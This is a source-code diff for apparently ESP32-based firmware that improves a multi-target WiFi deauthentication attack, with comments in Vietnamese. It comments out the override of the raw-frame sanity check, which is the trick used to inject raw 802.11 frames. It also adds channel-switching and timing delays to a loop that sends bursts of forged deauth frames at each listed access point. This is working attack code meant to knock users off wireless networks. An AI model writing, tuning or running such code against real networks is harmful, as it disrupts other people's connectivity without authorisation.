@@ -36,10 +36,10 @@ std::vector<wifi_ap_record_t> ap_records;
  * @attention This function is not meant to be called!
  * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
  */
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-    if (arg == 31337) return 1;
-    else return 0;
-}
+// extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+//     if (arg == 31337) return 1;
+//     else return 0;
+// }
 
 uint8_t deauth_frame[sizeof(deauth_frame_default)]; // 26 = [sizeof(deauth_frame_default[])]
 
@@ -285,17 +285,24 @@ std::vector<String> menu_strings;
 void execute_multi_deauth(const std::vector<wifi_ap_record_t>& targets) {
     if (targets.empty()) return;
     resetGlobalState();
-    if (!wifi_atk_setWifi()) return;
+    
+    // wifi_atk_setWifi() của Bruce đã gọi esp_wifi_stop() và start() rồi
+    // nên chúng ta không cần gọi Reset Stack thủ công ở đây nữa.
+    if (!wifi_atk_setWifi()) return; 
 
     drawMainBorderWithTitle("Multi-Deauth");
     while (true) {
         for (const auto &target : targets) {
-            // SỬA LỖI: Thêm _default_target để đủ 3 tham số
+            // C5 Cần thời gian để khóa tần số (PLL Lock) khi đổi kênh
+            esp_wifi_set_channel(target.primary, WIFI_SECOND_CHAN_NONE);
+            vTaskDelay(pdMS_TO_TICKS(50)); // Thêm 50ms nghỉ cho Radio ổn định
+
             wsl_bypasser_send_raw_frame(&target, target.primary, _default_target); 
             
             for (int i = 0; i < 40; i++) {
                 send_raw_frame(deauth_frame, 26);
                 if (check(EscPress)) break;
+                vTaskDelay(1); // Nghỉ 1ms giữa các gói để tránh sụt áp
             }
             if (check(EscPress)) break;
         }
